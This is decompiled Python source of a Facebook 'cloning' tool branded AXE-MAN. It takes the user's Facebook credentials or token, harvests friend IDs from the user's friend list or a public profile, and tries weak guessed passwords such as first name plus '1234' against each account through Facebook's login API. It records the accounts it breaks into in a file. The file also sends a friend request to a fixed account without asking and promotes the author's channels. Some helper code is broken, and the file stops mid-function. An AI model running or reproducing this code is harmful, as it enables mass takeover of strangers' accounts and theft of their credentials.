# Decompile by : Hamid Meer'hamii 
# Time Succes decompile : 2022-03-06 23:12:41.696278 


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] Token :")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')		

logo = """

\033[1;91m___________________________________¶¶¶¶
\033[1;91m__________________________________¶¶¶¶¶
\033[1;91m_______________________________¶¶¶¶¶¶¶
\033[1;91m_____________________________¶¶¶¶¶¶¶¶¶\033[1;92mP4K\033[1;93m-\033[1;97mH4C3RS
\033[1;91m___________________________¶¶¶¶¶¶¶¶¶¶¶
\033[1;93m_____________¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;93m____________¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;93m_____________¶_¶¶¶_¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______¶¶
\033[1;93m_____________¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;93m_____________¶¶___¶¶¶__¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;94m____________¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;94m_________111¶¶¶¶¶¶¶¶¶¶11111__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
\033[1;94m_______111___¶¶¶¶¶¶¶¶______¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;94m_____11________¶¶¶¶1_____¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶
\033[1;94m_____1__1_______¶¶_____111111______1¶¶¶¶¶¶¶¶
\033[1;95m____1___¶______________¶_11111_____¶¶¶¶¶¶¶
\033[1;95m___1____11___________¶¶¶11__1_1___¶¶¶¶¶
\033[1;95m__1_____111111_____¶¶¶1111___11
\033[1;95m__1____1¶1_1_____¶¶¶¶_1_11____1
\033[1;95m_111111_11_1___¶¶¶¶___1_111___1
\033[1;96m11___1___11__1¶¶¶1____111_11__1
\033[1;96m1_____11__11¶¶¶1______1¶____11\033[1;91m AXE\033[1;97m-\033[1;93mMAN
\033[1;96m_111_______¶¶¶_________¶_
\033[1;96m____111__1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;96m______¶¶1¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;97m____¶¶¶¶_¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;97m__¶¶¶¶___¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;97m__1¶1___1¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;97m________¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;97m________¶¶¶¶11¶¶__¶¶¶¶¶¶¶¶
\033[1;97m________¶¶¶¶1_¶¶__¶¶¶¶¶¶¶¶
\033[1;91m________¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶
\033[1;91m________¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶
\033[1;91m________¶¶¶¶¶¶1____1¶¶¶¶¶¶
\033[1;92m________¶¶¶¶¶¶______¶¶¶¶¶¶
\033[1;92m_______¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶
\033[1;92m_______¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶
\033[1;93m_______¶¶¶¶¶¶¶______¶¶¶¶¶¶¶
\033[1;93m_______¶¶¶¶¶¶¶______¶¶¶¶¶¶¶
\033[1;93m_______¶¶¶¶¶¶¶______1¶¶¶¶¶¶
\033[1;95m_______1¶¶¶¶¶________¶¶¶¶¶¶
\033[1;95m________¶¶¶¶__________¶¶¶¶¶\033[1;93mWATSAPP\033[1;97m-\033[1;96mCONTACT
\033[1;95m________¶¶¶¶__________¶¶¶¶¶
\033[1;96m_______1¶¶¶¶__________¶¶¶¶¶
\033[1;96m_______¶¶¶¶¶__________¶¶¶¶¶
\033[1;96m_______¶¶¶¶¶__________¶¶¶¶¶
\033[1;97m______¶¶¶¶¶¶__________¶¶¶¶¶¶\033[1;91m+9203123879770
\033[1;97m_______¶¶¶¶1__________1¶¶¶¶
\033[1;97m_______¶¶¶¶1__________1¶¶¶¶


\033[1;91m █████╗ ██╗  ██╗███████╗    ███╗   ███╗ █████╗ ███╗   ██╗\033[1;91m UPDATED"
\033[1;93m██╔══██╗╚██╗██╔╝██╔════╝    ████╗ ████║██╔══██╗████╗  ██║
\033[1;96m███████║ ╚███╔╝ █████╗█████╗██╔████╔██║███████║██╔██╗ ██║\033[1;91m COMMANDS"
\033[1;91m██╔══██║ ██╔██╗ ██╔══╝╚════╝██║╚██╔╝██║██╔══██║██║╚██╗██║
\033[1;93m██║  ██║██╔╝ ██╗███████╗    ██║ ╚═╝ ██║██║  ██║██║ ╚████║
\033[1;96m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                         

                                                   

\033[1;91m•─────────────────────────────────────────────•
\033[1;97m•--------------------\033[1;31m🗡AXE-MAN🗡\033[1;97m--------------------•
\033[1;96m🌟▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🌟
\033[1;92m🔪🔥Author Name: \033[1;97m MR-SH4DOW 🔥🔪
\033[1;92m🔪🔥Watsapp📲 →\033[1;97m +923123879770 🔥🔪
\033[1;92m🔪🔥YT Channel:\033[1;97m Billu Tricker🔥🔪
\033[1;92m🔪🔥From:\033[1;97m Pakistan🇵🇰 🔥🔪
\033[1;96m🌟▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🌟
\033[1;97m•------------------\033[1;31m♨MR-SH4DOW♨\033[1;97m------------------•
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mAXE-MAN█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m_______________________v____________________________
\033[1;91m_______________________$q___________________________
\033[1;91m______________________3¶¶v__________________________
\033[1;91m______________________¶¶¶¶__________________________
\033[1;91m_____________________¶¶¶¶¶o_______\033[1;93mqqv_______________
\033[1;91m____________________$¶¶¶¶¶¶¶_______\033[1;93m¶¶¶¶¶¶3__________
\033[1;91m___________________¶¶¶¶¶¶¶¶¶q______\033[1;93mo¶¶¶¶¶¶¶¶________
\033[1;91m__________________3¶¶¶¶¶¶¶¶¶¶q_____\033[1;93mv¶¶¶¶¶¶¶¶¶¶______
\033[1;91m___________________$¶¶¶¶¶¶¶¶_______\033[1;93m3¶¶¶¶¶¶¶¶¶¶¶$____
\033[1;91m____________________¶¶¶¶¶¶¶3_______\033[1;93m¶¶¶¶¶¶¶¶¶¶¶¶¶¶___
\033[1;93m_________¶¶v\033[1;91m_________$¶¶¶¶o_____\033[1;93mv¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
\033[1;93m_________q¶¶¶¶¶o\033[1;91m_____¶¶¶¶¶____\033[1;93mo¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
\033[1;93m_____o¶$¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶o_
\033[1;93moq$¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶q_
\033[1;93m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶v_
\033[1;93m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
\033[1;93m_________¶¶3o_______¶¶¶¶¶¶¶¶____\033[1;93m¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶o__
\033[1;96m____________________¶¶¶¶¶¶¶¶______\033[1;93m3¶¶¶¶¶¶¶¶¶¶¶¶¶v___
\033[1;96m____________________¶¶¶¶¶¶¶¶_______\033[1;93m¶¶¶¶¶¶¶¶¶¶¶¶_____
\033[1;96m____________________¶¶¶¶¶¶¶¶________\033[1;93m¶¶¶¶¶¶¶¶$_______
\033[1;96m____________________¶¶¶¶¶¶¶¶________\033[1;93m¶¶¶¶¶$__________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m____________________¶¶¶¶¶¶¶¶________________________
\033[1;96m___________________v¶¶¶¶¶¶¶¶________________________
\033[1;96m___________________v¶¶¶¶¶¶¶¶________________________
\033[1;96m___________________v¶¶¶¶¶¶¶¶________________________
\033[1;96m___________________v¶¶¶¶¶¶¶¶________________________
\033[1;96m___________________o¶¶¶¶¶¶¶¶________________________
\033[1;96m___________________o¶¶¶¶¶¶¶¶v_______________________
\033[1;96m___________________o¶¶¶¶¶¶¶¶v_______________________
\033[1;96m___________________q¶¶¶¶¶¶¶¶v_______________________
\033[1;96m___________________q¶¶¶¶¶¶¶¶v_______________________
\033[1;96m___________________q¶¶¶¶¶¶¶¶v_______________________
\033[1;96m___________________q¶¶¶¶¶¶¶¶o_______________________
\033[1;96m___________________3¶¶¶¶¶¶¶¶o_______________________
\033[1;96m___________________q¶¶¶¶¶¶¶¶o_______________________
                                                                                                                             


\033[1;92m  _______ ____   ____  _                 __   ________ 
\033[1;92m |__   __/ __ \ / __ \| |          /\    \ \ / /  ____|
\033[1;92m    | | | |  | | |  | | |  ______ /  \    \ V /| |__   
\033[1;92m    | | | |  | | |  | | | |______/ /\ \    > < |  __|  
\033[1;92m    | | | |__| | |__| | |____   / ____ \  / . \| |____ 
\033[1;92m    |_|  \____/ \____/|______| /_/    \_\/_/ \_\______|
                                                       
           
\033[1;97m _______  _______  ____   _______  _______   _____   _______  _______  _______  _______  _______ 
\033[1;97m|  _    ||       ||    | |       ||       | |  _  | |       ||  _    ||       ||       ||  _    |
\033[1;97m| | |   ||___    | |   | |____   ||___    | | |_| | |___    || | |   ||___    ||___    || | |   |
\033[1;97m| | |   | ___|   | |   |  ____|  | ___|   ||   _   |    |   || |_|   |    |   |    |   || | |   |
\033[1;97m| |_|   ||___    | |   | | ______||___    ||  | |  |    |   ||___    |    |   |    |   || |_|   |
\033[1;97m|       | ___|   | |   | | |_____  ___|   ||  |_|  |    |   |    |   |    |   |    |   ||       |
\033[1;97m|_______||_______| |___| |_______||_______||_______|    |___|    |___|    |___|    |___||_______|
                                            
    
                                 
                                 
           
\033[1;91m•─────────────────────────────────────────────•
 \033[1;96m🌟▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🌟
 """
CorrectUsername = "AXE"
CorrectPassword = "MAN"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[🔐] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[🔐] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;92m")
        if (password == CorrectPassword):
            print "🔓Logged in successfully as " + username #Dev:MR-SHADOW
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q')

def lisensi():
	os.system('clear')
	login()
def login():
	os.system('clear')
	print logo
	print "\033[1;92m[💫1💫]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
        time.sleep(0.05)
        print "\033[1;92m[💫2💫]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
        time.sleep(0.05)
        print "\033[1;93m[💫3💫]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
        time.sleep(0.05)
        print "\033[1;94m[💫4💫]\033[1;47m\033[1;31mSubscribe billu Tricker      \033[1;0m"
        time.sleep(0.05)
	print "\033[1;95m[💫5💫]\033[1;47m\033[1;31mJoin Whatsapp group For Help           \033[1;0m"
        time.sleep(0.05)
        print "\033[1;96m[❌0❌]\033[1;47m\033[1;31mExit                             \033[1;0m"
	time.sleep(0.05)
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97m[✅] \033[0;31mSelect Option: \033[1;92m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
        elif peak =="4":
	        os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q')
	        login()
        elif peak =="5":
	        os.system('xdg-open https://chat.whatsapp.com/DmAdpEsgjhr9Z5zSzwWuj6 ')
                login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print "\033[1;97m•------------------------\033[1;37mAXE-MAN-404\033[1;97m------------------------•"
		print('\033[1;97m[✨]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
		print('	' )
		id = raw_input('\033[1;97m[👻] \x1b[1;91mNumber/Email\x1b[1;97m: \x1b[1;92m')
		pwd = raw_input('\033[1;97m[👻] \x1b[1;91mPassword\x1b[1;97m    : \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\033[1;47m\033[1;92mAXEM  Login Successful\033[1;0m'
				os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97m∆CP∆ Creat A New Account")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97m∆CP∆Creat A New Account"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:MR-SHADOW
	print logo
	print "\033[1;37m[🔍]\033[1;95m Logged in User Information\033[1;92m"
	time.sleep(0.05)
	print "\033[1;37m[⚡]\033[1;93m Name\033[1;93m:\033[1;93m"+nama+"\033[1;92m               "
	time.sleep(0.05)
	print "\033[1;37m[⚡]\033[1;96m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;96m              "
	time.sleep(0.05)
	print "\033[1;97m💡•-------------------\033[1;37mAXE-MAN-404\033[1;97m-------------------•💡"
	print "\033[1;92m[1]\033[1;47m\033[1;31mStart Fast Cloning                          \033[1;0m"
	time.sleep(0.05)
	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                     \033[1;0m"
	time.sleep(0.05)
	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update AXE-MAN-404                         \033[1;0m"
	time.sleep(0.05)
	print "\033[1;95m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
	time.sleep(0.05)
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;31mSelect Option: \033[1;92m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
        elif unikers =="1":		
	        super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;91m=10%')
                jalan("\033[1;92m==20%")
                jalan('\033[1;93m===30%')
                jalan('\033[1;94m====40%')
                jalan("\033[1;95m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;97m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;95m=========90%')
                jalan('\033[1;94m==========100%')
                jalan('\033[1;93mCloning Data Reset and update by MR-SH4DOW')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;91m=10%')
                jalan("\033[1;92m==20%")
                jalan('\033[1;93m===30%')
                jalan('\033[1;94m====40%')
                jalan("\033[1;95m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;97m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;95m=========90%')
                jalan('\033[1;94m==========100%')
                jalan('\033[1;93mCloning Data Reset and update by MR-SH4DOW')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[1]\033[1;47m\033[1;91mClone From Friend List    \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[2]\033[1;47m\033[1;91mClone From Public Id \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;47m\033[1;91mBack                     \033[1;0m"
	time.sleep(0.05)
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m[+]\033[1;91mSelect Option: \033[1;92m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print "\033[1;97m•--------------------\033[1;37mAXE-MAN-404\033[1;97m--------------------•"
		print logo
		jalan('\033[1;97m[+]\033[1;91mAXE-MAN█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print "\033[1;97m•--------------------\033[1;37mAXE-MAN-404\033[1;97m--------------------•"
		print logo
		idt = raw_input("\033[1;97m[👻]\033[1;91mEnter USER NAME\033[1;97m: \033[1;95m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[✨]\033[1;93mName\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;97m[✨]\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;97m[✨]\033[1;96mAXE-MAN█████████████████▒▒▒▒▒▒▒▒..100%\033[1;97m:-:"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[✨]\033[1;92mTotal Accounts\033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[✨]\033[1;37mCLONING Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
	print "\n\033[1;97m[✨]\x1b[1;31mStop Process Press CTRL+Z"
	print "\033[1;97m•--------------------\033[1;37m\033[1;97m\033[1;97m--------------------•"
 	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:MR-SHADOW
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[👻] \x1b[1;92m[OK]'											
				print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;92m' + user											
				print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;91m[👻] \x1b[1;96m[Checkpoint]'
				    print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b ['name']
				    print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;92m' + user
				    print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[👽] \x1b[1;92m[OK]'											
				            print '\x1b[1;93m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				            print '\x1b[1;92m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;95m' + user								
				            print '\x1b[1;91m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[👽] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;93m[👽] \x1b[1;97mName \x1b[1;93m    : \x1b[1;97m' + b['name']
				               print '\x1b[1;92m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;95m' + user
				               print '\x1b[1;91m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[👻] \x1b[1;92m[OK]'								
						       print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']									
						       print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;93m' + user							
						       print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;91m[👻] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                           print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;93m' + user
